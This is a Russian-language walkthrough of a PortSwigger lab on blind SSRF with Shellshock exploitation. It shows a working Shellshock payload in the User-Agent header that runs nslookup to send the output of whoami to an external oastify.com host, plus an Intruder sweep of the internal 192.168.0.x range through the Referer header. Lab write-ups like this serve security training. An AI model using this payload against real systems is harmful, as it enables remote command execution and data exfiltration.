Для выполнения лабораторной работы необходимо расширение `Collaborator Everywhere`. Установим его
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/1.png)
перейдем на каорточку случайного товара и добавим домен в скоуп
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/2.png)

расширение показало, что можно отсукнуться на DGA домен
```
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@457lkwytzx29nri5g65hqp8offlh96.oastify.com
```
отправим запрос с обычной карточкой товара в репитер
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/3.png)
и изменим параметры на
```
GET /product?productId=1
...
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).6v2hel4sf03pdlvv33deyg7ycpig67uw.oastify.com
...
Referer: http://192.168.0.1:8080 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/4.png)
Видим, что запрос прошел, но отстука на наш сгенерированный DGA домен не поступило
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/5.png)

отправим даннный запрос в интрудер
```
Referer: http://192.168.0.§1§:8080
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/6.png)
и выберем всю подсетку от `0-255`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/7.png)
Смотреть на результат атаки нет смысла, так как каждый раз выдает 200 статус респонс код
вернемся в коллаборатор и посмотрим отстук
```
The Collaborator server received a DNS lookup of type A for the domain name `peter-Aaq4nR.6v2hel4sf03pdlvv33deyg7ycpig67uw.oastify.com`.  The lookup was received from IP address 99.80.88.10:39366 at 2023-Nov-25 05:09:34.411 UTC.
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/8.png)
Cдадим в качестве ответа  `peter-Aaq4nR` и получим сообщение об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation/pics%20for%20walktrough/9.png)
